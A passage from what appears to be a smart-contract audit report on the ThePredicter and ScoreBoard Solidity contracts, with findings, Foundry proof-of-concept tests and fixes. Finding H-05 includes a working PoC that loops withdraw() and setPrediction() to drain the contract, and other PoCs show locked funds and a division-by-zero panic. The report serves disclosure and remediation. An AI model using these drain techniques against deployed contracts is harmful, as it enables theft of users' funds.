        // result set and tournament ends
        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.Draw);
        scoreBoard.setResult(1, ScoreBoard.Result.Draw);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        // player wants to withdraw
        uint256 balanceBeforeWithdraw = player.balance;
        vm.prank(player);
        thePredicter.withdraw();
        uint256 balanceAfterWithdraw = player.balance;
        assert(balanceAfterWithdraw > balanceBeforeWithdraw);
    }
```

then run the following `forge test --mt test_POCWithdrawAfterOnlyMakeOnePrediction`

the result should FAIL:

```bash
Failing tests:
Encountered 1 failing test in test/ThePredicter.test.sol:ThePredicterTest
[FAIL. Reason: ThePredicter__NotEligibleForWithdraw()] test_POCWithdrawAfterOnlyMakeOnePrediction() (gas: 229352
```

</details>

## Impact

protocol not functioning like as stated in the documentation

## Tools Used

foundry

## Recommendations

correct the operator used in the `isEligibleForReward` function:

```diff
    function isEligibleForReward(address player) public view returns (bool) {
-       return results[NUM_MATCHES - 1] != Result.Pending && playersPredictions[player].predictionsCount > 1;
+       return results[NUM_MATCHES - 1] != Result.Pending && playersPredictions[player].predictionsCount >= 1;
    }
```

and correct the logic for the `setPrediction` function:

```diff
    function setPrediction(address player, uint256 matchNumber, Result result) public onlyThePredicter {
        if (block.timestamp <= START_TIME + matchNumber * 68400 - 68400) {
            playersPredictions[player].predictions[matchNumber] = result;
        }
+       // checks if this is the first match
+       if (results[0] == Result.Pending) {
+           playersPredictions[player].predictionsCount = 1;
+       } else {
            playersPredictions[player].predictionsCount = 0;
            for (uint256 i = 0; i < NUM_MATCHES; ++i) {
                if (playersPredictions[player].predictions[i] != Result.Pending && playersPredictions[player].isPaid[i])
                {
                    ++playersPredictions[player].predictionsCount;
                }
            }
+       }
    }
```

then run again the command `forge test --mt test_POCWithdrawAfterOnlyMakeOnePrediction` the result should PASS:

```bash
Ran 1 test for test/ThePredicter.test.sol:ThePredicterTest
[PASS] test_POCWithdrawAfterOnlyMakeOnePrediction() (gas: 224776)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 1.07ms (270.66µs CPU time)
```

## <a id='H-05'></a>H-05. `ThePredicter.withdraw` combined with `ScoreBoard.setPrediction` allows a player to withdraw rewards multiple times leading to a drain of funds in the contract

_Submitted by [0xrochimaru](/profile/clk687ykf0000l608ovci3h3y), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [vinicaboy](/profile/clvguw51c0000i5vku9mx50lp), [emma77](/profile/cly4a1lnh0006toid1f968izd), [CoderOfPHCity](/profile/clymt4o9v000ci1pjryaxc50o), [bytesflow007](/profile/clywm16360006sr4igeys47em), [Decap](/profile/clxq2qv860000147d51xg5d88). Selected submission by: [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8)._      
            


## Summary

A malicious user can make use of the functions `ThePredicter.withdraw` and `ScoreBoard.setPrediction` to withdraw rewards multiple times and drain most / all of the contract funds.

## Vulnerability Details

The function `ThePredicter.withdraw` uses the function `ScoreBoard.isElegibleForReward` to determine if a player can claim rewards. `ScoreBoard.isElegibleForReward` checks that the value of `ScoreBoard.playersPrediction[player].predictionsCount` is greater than one to allow a user to claim rewards, and the function `ThePredicter.withdraw` sets that value to 0 to prevent a player from claiming the rewards twice. However, the function `ScoreBoard.setPrediction` can be used by the player to set `ScoreBoard.playersPrediction[player].predictionsCount` to a value greater than 0, allowing the player to claim the rewards again.

This mechanism can be used multiple times to drain potentially all the funds in `ThePredicter`

The following PoC based on existing tests in the repository shows how a user can drain the contract by exploiting this vulnerability

```Solidity
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract MultipleWithdrawTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            0.04 ether,
            0.0001 ether
        );
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();
    }

    function test_multipleWithdrawForSinglePlayer() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();


        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        vm.stopPrank();


        // make predictions
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(stranger2);
        // make multiple withdrawals until the contract does not have
        // enough funds
        while (true) {
            try thePredicter.withdraw() {
                // any prediction will do, does not have to be valid
                scoreBoard.setPrediction(stranger2, 0, ScoreBoard.Result.First);
            } catch {
                break;
            }
        }
        vm.stopPrank();


        vm.startPrank(stranger3);
        // this should not revert, but it does, because the contract
        // does not have enough funds to pay the player due to the
        // previous multiple withdrawals
        vm.expectRevert();
        thePredicter.withdraw();
        vm.stopPrank();

        // the contract is empty
        assertEq(address(thePredicter).balance, 0);
    }
}
```

## Impact

* Complete loss of funds

## Tools Used

Foundry

## Recommendations

* Keep track explicitly of which users have already withdraw the rewards in `ThePredicter` using a mapping(address => bool) or similar, and revert in case a player wants to withdraw multiple times.

Optionally

* Add events when withdrawals are made to have more visibility of player actions.


# Medium Risk Findings

## <a id='M-01'></a>M-01. Incorrect Time Calculation

_Submitted by [Vik](/profile/clymxs69m0004elf11nb8vr2s), [Strapontin](/profile/cly31tqmc000a4ts4lyngk9ro), [tired](/profile/clufaacob0000e57kqrmiq0f7), [lulox](/profile/clk7oytas000wme08y4yvo0tp), [evmninja](/profile/clxxng1pm0000mnz6avhempwf), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [unnamed](/profile/cluxox1890000tz36ctgyeix8), [pob001](/profile/cly3k3wi10004mwcab5qdnjis), [Bbash](/profile/clkcphh780004mp083mgcgae1), [Saurabh](/profile/clymo4jw00000348qfz2ncao1), [Enchev](/profile/clvuhiie70000behfon10s33j), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [Silverwind](/profile/clld9fbfq0000l908smg5kh8s), [Tomas0707](/profile/clyr7capb000lds5vs80fhv4n), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [0xjoaovpsantos](/profile/clwigghmc000s14ecvmooztur), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [BryanConquer](/profile/cllw1qa7j0000jw08yme07cs2), [Kiinzu](/profile/clx32i4zw000wuro9kj83liax), [soupy](/profile/clxtrdlee0002mh58dhdplsq9), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [bytesflow007](/profile/clywm16360006sr4igeys47em), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if), [kapten](/profile/clvkgt6g50000zx4r6jijra5k), [FrontRunner](/profile/cly4fmqoh0007xkrp388nctox), [Nexarion](/profile/clxywis730000bqg3at2wifou), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Josh4324](/profile/clk75kd79000gjw08o1v6ycq7), [PatrickWorks](/profile/clxuq1bgc0000xkea15f3i4ty), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [0xsagetony](/profile/clnxw408y000gl6086iqksw4c), [ivanonchain](/profile/clynomnfs0000g3kl460qpvlz), [Decap](/profile/clxq2qv860000147d51xg5d88), [0xD4n13l](/profile/cly4ahx3v0002foqagqltp3n7), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow), [EdTim](/team/clyyfb36400015vdk4lj72qel), [14xSachet](/profile/clz15oltz0006q1gtgf0ywir8), [SoulReaper](/profile/clyo4gcjd0006qkx7j73nyuep), [ayamercy](/team/clz09i1y50001hibkcpjzt4np), [iamthesvn](/profile/clwq0jvk500002bu6kde6smv1). Selected submission by: [evmninja](/profile/clxxng1pm0000mnz6avhempwf)._      
            


## Summary

A bug in time calculation prevents the system to be used beyond the first match.

## Vulnerability Details

The code from `ThePredicter` contract on line 93 adds 18 hours starting from the second match, assuming that `matchNumber` is between 0 and 8 (0 means the first match and 8 means the last match). The calculation yields the following date and time:

* Match Number 0: Thu Aug 15 2024 20:00:00 GMT+0000
* Match Number 1: Fri Aug 16 2024 15:00:00 GMT+0000
* Match Number 2: Sat Aug 17 2024 10:00:00 GMT+0000
* Match Number 3: Sun Aug 18 2024 05:00:00 GMT+0000
* Match Number 4: Mon Aug 19 2024 00:00:00 GMT+0000
* Match Number 5: Mon Aug 19 2024 19:00:00 GMT+0000
* Match Number 6: Tue Aug 20 2024 14:00:00 GMT+0000
* Match Number 7: Wed Aug 21 2024 09:00:00 GMT+0000
* Match Number 8: Thu Aug 22 2024 04:00:00 GMT+0000

A similar code is also found on `ScoreBoard` contract on line 66.

## Impact

The system deviates from the expected behaviour in terms of limiting the time to make predictions.

## Tools Used

Manual review.

## Recommendations

Consider replacing the code on line 93 of `ThePredicter` contract and line 66 of `ScoreBoard` contract with the following snippet:

```Solidity
if (block.timestamp > START_TIME + matchNumber * 86400 - 3600) {
```

After the change, it is expected that we have the following timestamps:

* Match Number 0: Thu Aug 15 2024 19:00:00 GMT+0000
* Match Number 1: Thu Aug 16 2024 19:00:00 GMT+0000
* Match Number 2: Thu Aug 17 2024 19:00:00 GMT+0000
* Match Number 3: Thu Aug 18 2024 19:00:00 GMT+0000
* Match Number 4: Thu Aug 19 2024 19:00:00 GMT+0000
* Match Number 5: Thu Aug 20 2024 19:00:00 GMT+0000
* Match Number 6: Thu Aug 21 2024 19:00:00 GMT+0000
* Match Number 7: Thu Aug 22 2024 19:00:00 GMT+0000
* Match Number 8: Thu Aug 23 2024 19:00:00 GMT+0000

## <a id='M-02'></a>M-02. ThePredicter.withdrawPredictionFees incorrectly computes the value to be transferred to the organizer, which leads to pending players not being able to cancel their registration and approved players not being able to claim their rewards

_Submitted by [0xrochimaru](/profile/clk687ykf0000l608ovci3h3y), [uba7](/profile/cllina1ss0000jt08ols0vdm7), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [Enchev](/profile/clvuhiie70000behfon10s33j), [Tomas0707](/profile/clyr7capb000lds5vs80fhv4n), [n3smaro](/profile/clyw8gc2200009pkxbzh2omnk), [EyanIngles](/profile/clxh58cp20000v6jwv7hjrjyh), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [emma77](/profile/cly4a1lnh0006toid1f968izd), [Greese](/profile/cly3p0t680000xrr4hv5jmgby), [PatrickWorks](/profile/clxuq1bgc0000xkea15f3i4ty), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [kazan](/profile/clojsw8kw000cl408g7y0xlw5). Selected submission by: [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8)._      
            


## Summary

The function `ThePredicter.withdrawPredictionFees` incorrectly computes the value to be transferred to the organizer if it is executed while there are Players in Pending status. This can lead to Pending players not being able to cancel their registration and consequently not being refunded. It can also lead to approved players not being able to withdraw their corresponding rewards.

## Vulnerability Details

If the organizer executes the function `ThePredicter.withdrawPredictionFees` while there are players in `Pending` status, the entrance fee of those players will be transferred to the organizer.

If those pending users want to cancel their registration, the funds will not be available to refund them, so the cancellation will revert.

If those players are approved by the organizer, the entrance fees that would be used for the player's rewards will not be there, so the `ThePredicter.withdraw` function will revert before having transferred all the corresponding rewards to the players.

The following PoC based on test already present in the repository show how this issue could arise and affect the `withrdraw` and `cancelRegistration` functions:

```Solidity
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Strings} from "@openzeppelin/contracts/utils/Strings.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract IncorrectWithrawPredictionFeesAmountTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    uint256 entranceFee = 0.04 ether;
    uint256 predictionFee = 0.0001 ether;

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            entranceFee,
            predictionFee
        );
        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();
    }

    function test_incorrectWitdrawPrediction_pendingPlayersCannotCancelRegistration() public {
        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: entranceFee}();
        vm.stopPrank();


        uint256 organizerBalanceBefore = organizer.balance;
        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();
        uint256 organizerBalanceAfter = organizer.balance;

        // No predictions where done, so the balance should not have changed.
        // However, the balance increased. The entrance fee of "stranger" was
        // transfered to the organizer
        assertEq(organizerBalanceAfter, organizerBalanceBefore + entranceFee);


        // Now the stranger cannot cancel the registration because the
        // contract does not have funds
        vm.startPrank(stranger);
        vm.expectRevert();
        thePredicter.cancelRegistration();
        vm.stopPrank();
    }

    function test_incorrectWitdrawPrediction_approvedPlayersCannotReceiveRewards() public {
        address stranger2 = makeAddr("stranger2");
        address stranger3 = makeAddr("stranger3");

        vm.startPrank(stranger);
        vm.deal(stranger, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.deal(stranger2, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.deal(stranger3, 1 ether);
        thePredicter.register{value: 0.04 ether}();
        vm.stopPrank();

        // withdrawPredictionFees called before players were approved
        // sends all contract funds to the organizer, including entranceFees
        vm.startPrank(organizer);
        thePredicter.withdrawPredictionFees();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(stranger);
        thePredicter.approvePlayer(stranger2);
        thePredicter.approvePlayer(stranger3);
        vm.stopPrank();


        // make predictions
        vm.startPrank(stranger);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.Draw
        );
        vm.stopPrank();

        vm.startPrank(stranger2);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.Draw
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(stranger3);
        thePredicter.makePrediction{value: 0.0001 ether}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            2,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: 0.0001 ether}(
            3,
            ScoreBoard.Result.First
        );
        vm.stopPrank();

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();

        vm.startPrank(stranger2);
        vm.expectRevert();
        thePredicter.withdraw();
        vm.stopPrank();

        vm.startPrank(stranger3);
        vm.expectRevert();
        thePredicter.withdraw();
        vm.stopPrank();
    }
}
```

## Impact

Incorrect computation of transferred funds.

The `cancelRegistration` and `withdraw` functions will not behave as expected. Those functions will revert before being able to refund and / or reward the players.

## Tools Used

Foundry

## Recommendations

* Keep track of the prediction fees received in a state variable. Make the function `ThePredicter.withdrawPredictionFees` use the value of that variable to transfer the funds and reset it to 0.

Optionally

* Implement events on user registration, approval and cancellation to have better visibility of the state of each user in the system.

## <a id='M-03'></a>M-03. [H-2] Not accounting for a possible score of 0 in `ThePredictor::withdraw` will lead to stuck funds

_Submitted by [0xrochimaru](/profile/clk687ykf0000l608ovci3h3y), [cryptedOji](/profile/clxq432gf0000oyuawxf6o6f7), [mayhem](/profile/clx4o39v90008cbjz1uv6cb45), [Enchev](/profile/clvuhiie70000behfon10s33j), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [Mikb](/profile/clslpacxq0000feicl13m1czy), [ElProfesor](/profile/cly2u64aq0006jz4llp8el8nu), [Coffee](/profile/clln3vyj7000cml0877uhlb7j), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [bytesflow007](/profile/clywm16360006sr4igeys47em), [Decap](/profile/clxq2qv860000147d51xg5d88), [kapten](/profile/clvkgt6g50000zx4r6jijra5k), [heeze](/profile/clvo0x1yi0004at0gi4dxnkow). Selected submission by: [mayhem](/profile/clx4o39v90008cbjz1uv6cb45)._      
            


## Summary

The protocol makes the assumption that players will either have a positive or negative score when performing calculations in `ThePredicter::withdraw`. Specifically, this if check assigns a value to `withdraw::reward` :

```js
reward = maxScore < 0
	? entranceFee
	: (shares * players.length * entranceFee) / totalShares;
```

The check assumes that `maxScore` will either be less than or greater than 0. In a situation where all players end up with a score of 0, withdraw will return a `[FAIL. Reason: panic: division or modulo by zero (0x12)]` error due to `totalShares == 0`.\
Considering users should have their `entranceFee` returned if `maxScore < 0`, we can assume the intentions would be the same if `maxScrore == 0`. Not accounting for `maxScore == 0` will result in funds being stuck in the contract.

## Vulnerability Details

In order for a player to be eligible for withdraw, they must pass this check:

```js
if (!scoreBoard.isEligibleForReward(msg.sender))
```

`ScoreBoard::isEligibleForReward` requires that a player make at least 1 prediction:

```js
function isEligibleForReward(address player) public view returns (bool) {
	return
		results[NUM_MATCHES - 1] != Result.Pending &&
		playersPredictions[player].predictionsCount > 1;
}
```

In `Predicter::withdraw`, a user's payout is determined by `uint256 totalShares = uint256(totalPositivePoints);`. The calculation is made in a for loop checking each players score

```js
for (uint256 i = 0; i < players.length; ++i) {
	int8 cScore = scoreBoard.getPlayerScore(players[i]);
	if (cScore > maxScore) maxScore = cScore;
	if (cScore > 0) totalPositivePoints += cScore;
}
```

`ScoreBoard::getPlayerScore` will either return `2` or `-1`:

```js
score += playersPredictions[player].predictions[i] == results[i]
	? int8(2)
	: -1;
```

This allows for `withdraw::totalPositivePoints` to equal 0. In those situations, `withdraw` will return a panic error.

<details>

<summary> Proof of Concept (foundry test)</summary>

1. A max number of participants enter the protocol
2. Each participant predicts one match correctly and two incorrectly leading to a score of 0 for all players
3. `test_NormalWithdraw` will attempt to withdraw but result in a panic error

```js
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {ThePredicter} from "../src/ThePredicter.sol";
import {ScoreBoard} from "../src/ScoreBoard.sol";

contract ThePredicterTest is Test {
    ThePredicter public thePredicter;
    ScoreBoard public scoreBoard;
    address public organizer = makeAddr("organizer");
    address public stranger = makeAddr("stranger");

    uint256 public constant PICK_A_NUMBER = 30;
    address[] players = new address[](PICK_A_NUMBER);

    function setUp() public {
        vm.startPrank(organizer);
        scoreBoard = new ScoreBoard();
        thePredicter = new ThePredicter(
            address(scoreBoard),
            0.04 ether,
            0.0001 ether
        );

        scoreBoard.setThePredicter(address(thePredicter));
        vm.stopPrank();
    }

    modifier participants() {
        for (uint256 i =0; i < PICK_A_NUMBER; i++) {
            string memory stringNumber = vm.toString(i);
            players[i] = makeAddr(stringNumber);
            vm.deal(players[i], 1 ether);
            vm.startPrank(players[i]);
            thePredicter.register{value: 0.04 ether}();
            vm.stopPrank();

            vm.startPrank(organizer);
            thePredicter.approvePlayer(players[i]);
            vm.stopPrank();

            vm.startPrank(players[i]);
            thePredicter.makePrediction{value: 0.0001 ether}(
                1,
                ScoreBoard.Result.First
            );
            thePredicter.makePrediction{value: 0.0001 ether}(
                2,
                ScoreBoard.Result.Second
            );
            thePredicter.makePrediction{value: 0.0001 ether}(
                3,
                ScoreBoard.Result.Second
            );
        }

        vm.startPrank(organizer);
        scoreBoard.setResult(0, ScoreBoard.Result.First);
        scoreBoard.setResult(1, ScoreBoard.Result.First);
        scoreBoard.setResult(2, ScoreBoard.Result.First);
        scoreBoard.setResult(3, ScoreBoard.Result.First);
        scoreBoard.setResult(4, ScoreBoard.Result.First);
        scoreBoard.setResult(5, ScoreBoard.Result.First);
        scoreBoard.setResult(6, ScoreBoard.Result.First);
        scoreBoard.setResult(7, ScoreBoard.Result.First);
        scoreBoard.setResult(8, ScoreBoard.Result.First);
        vm.stopPrank();
        _;
    }

	function test_NormalWithdraw() public participants{
		vm.startPrank(address(players[1]));
		thePredicter.withdraw();
		vm.stopPrank();
		assertEq(players[1].balance, 0.9997 ether);
	}
}
```

</details>

## Impact

This is a high impact vulnerability. It can occur if no one gets any predictions correct or if the sum of predictions scores equals zero. The odds of this occurring will depend on how many players enter the protocol, how frequently the players will make predictions (as they are not obligated to predict every match), and the precision of their predictions.  The vulnerability will lead to a loss of all funds except for the prediction fees.

## Tools Used

Manual Review
Foundry

## Recommendations

We need to adjust the logic in `Predicter::withdraw`
One fix would be to include 0 for `maxScore`:

```diff
+ reward = maxScrore <= 0
- reward = maxScore < 0
		? entranceFee
		: (shares * players.length * entranceFee) / totalShares;
```

Or account for `totalShares` being 0:

```diff
+ if (totalShares == 0) {
+	 reward = entranceFee;
+ } else {
+	reward = maxScore < 0
+	 ? entranceFee
+	 : (shares * players.length * entranceFee) / totalShares;
+ }
- reward = maxScore < 0
-		? entranceFee
-		: (shares * players.length * entranceFee) / totalShares;
```


# Low Risk Findings

## <a id='L-01'></a>L-01. It would be possible to make a prediction for an ongoing or already finished match if the Arbitrum timestamps deviate according to what the documentation states as possible

_Submitted by [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8), [appet](/profile/cltrb8svc000u2ps0trbj1d8n), [abhishekthakur](/profile/clkaqh5590000k108p39ktfwl), [V1vah0us3](/profile/clvzfjns5000024axn3o3i5if). Selected submission by: [artilugio0](/profile/cly7mkqh60000nm4e3vv9kbt8)._      
            


## Summary

During unlikely circumstances, it might be possible for players to make predictions using the function `ThePredicter.makePrediction` during a match or even after a match has finished.

## Vulnerability Details

Although the function `ThePredicter.makePrediction` has validations in place to prevent players to make predictions during or after a match, according to Arbitrum's documentation ([https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#block-timestamps-arbitrum-vs-ethereum)](https://docs.arbitrum.io/build-decentralized-apps/arbitrum-vs-ethereum/block-numbers-and-time#block-timestamps-arbitrum-vs-ethereum), although unlikely, there is a chance that the `block.timestamp` could have a deviation up to 24 hours in the past. Meaning that there is a chance that users might be able to make predictions on ongoing matches, or matches that have already finished and whose results are already known.

The same issue is present in `Scoreboard.setPrediction` function.

## Impact

* Players could make predictions for ongoing or already finished matches.

## Tools Used

## Recommendations

* Add a function only available to the organizer that makes a state change in the contract to prevent further predictions to be made for a specific match. The function `ThePredicter.makePrediction` would have to check that state to allow a player to make a prediction. The organizer would only use the new function in case the block.timestamp deviation with the actual time is found to be significant.
* Make a similar change for `Scoreboard.setPrediction` function, which is affected as well.
* Alternatively, consider using `block.number` instead of `block.timestamp` which might be more reliable.

## <a id='L-02'></a>L-02. Small amount of funds can remain stuck in contract due to precision loss

_Submitted by [Enchev](/profile/clvuhiie70000behfon10s33j), [Yaioxy](/profile/clpd5e0m30002ll5wwhxvqj1u), [Decap](/profile/clxq2qv860000147d51xg5d88). Selected submission by: [Enchev](/profile/clvuhiie70000behfon10s33j)._      
            


## Summary
Small amount of funds can remain stuck in the `ThePredicter` contract due to precision loss.

## Vulnerability Details
The method `ThePredicter::withdraw` is responsible for players to withdraw their prize pool. It contains the following calculation `(shares * players.length * entranceFee) / totalShares` but since Solidity does not support floating point numbers it could lead to precision loss. If there was no precision loss calling the method `ThePredicter::withdrawPredictionFees` by the organizer and `ThePredicter::withdraw` by all players eligable for rewards, it would leave the contract with 0 balance. However, small amounds of funds can remain as shown in the proof of code due to the precision loss.

## Impact
Small amount of funds remain stucked in the contract.


## Tools Used
Manual Review, Foundry

## Proof Of Code
1) Add the following test case `ThePredicter.test.sol`:
```javascript
function test_remainingFundsAreStuckedInContract() public {
    vm.startPrank(organizer);

    uint256 registrationFee = 0.001 ether;
    uint256 predictionFee = 0.003 ether;

    scoreBoard = new ScoreBoard();
    thePredicter = new ThePredicter(
        address(scoreBoard),
        registrationFee,
        predictionFee
    );
    scoreBoard.setThePredicter(address(thePredicter));
    vm.stopPrank();

    address stranger2 = makeAddr("stranger2");
    address stranger3 = makeAddr("stranger3");
    address stranger4 = makeAddr("stranger4");
    address stranger5 = makeAddr("stranger5");
    address stranger6 = makeAddr("stranger6");
    address stranger7 = makeAddr("stranger7");

    address[7] memory players = [stranger, stranger2, stranger3, stranger4, stranger5, stranger6, stranger7];

    for (uint256 i = 0; i < players.length; i++) {
        address player = players[i];
    
        vm.startPrank(player);
        vm.deal(player, 1 ether);
        thePredicter.register{value: registrationFee}();
        vm.stopPrank();

        vm.startPrank(organizer);
        thePredicter.approvePlayer(player);
        vm.stopPrank();
    }
    
    for (uint256 i = 0; i < players.length; i++) {
        address player = players[i];
   
        vm.startPrank(player);

        thePredicter.makePrediction{value: predictionFee}(
            0,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: predictionFee}(
            1,
            ScoreBoard.Result.First
        );
        thePredicter.makePrediction{value: predictionFee}(
            2,
            i % 2 == 0 ? ScoreBoard.Result.First : ScoreBoard.Result.Second
        );

        vm.stopPrank();
    }

    vm.startPrank(organizer);
    scoreBoard.setResult(0, ScoreBoard.Result.First);
    scoreBoard.setResult(1, ScoreBoard.Result.First);
    scoreBoard.setResult(2, ScoreBoard.Result.First);
    scoreBoard.setResult(3, ScoreBoard.Result.First);
    scoreBoard.setResult(4, ScoreBoard.Result.First);
    scoreBoard.setResult(5, ScoreBoard.Result.First);
    scoreBoard.setResult(6, ScoreBoard.Result.First);
    scoreBoard.setResult(7, ScoreBoard.Result.First);
    scoreBoard.setResult(8, ScoreBoard.Result.First);
    vm.stopPrank();

    vm.startPrank(organizer);
    thePredicter.withdrawPredictionFees();
    vm.stopPrank();

    for (uint256 i = 0; i < players.length; i++) {
        address player = players[i];

        vm.startPrank(player);
        thePredicter.withdraw();
        vm.stopPrank();
    }

    uint256 remainingBalance = address(thePredicter).balance;
    console.log("Remaining funds:", remainingBalance);
    assert(remainingBalance > 0);
}
```

2) Execute the following command: `forge test --mt test_remainingFundsAreStuckedInContract -vvvvvvv`

3) Verify from the logs that there is small amount of funds remaining:  `Remaining funds: 4`

## Recommendations
Implement method which allows for the organizer to withdraw the remaining funds.




    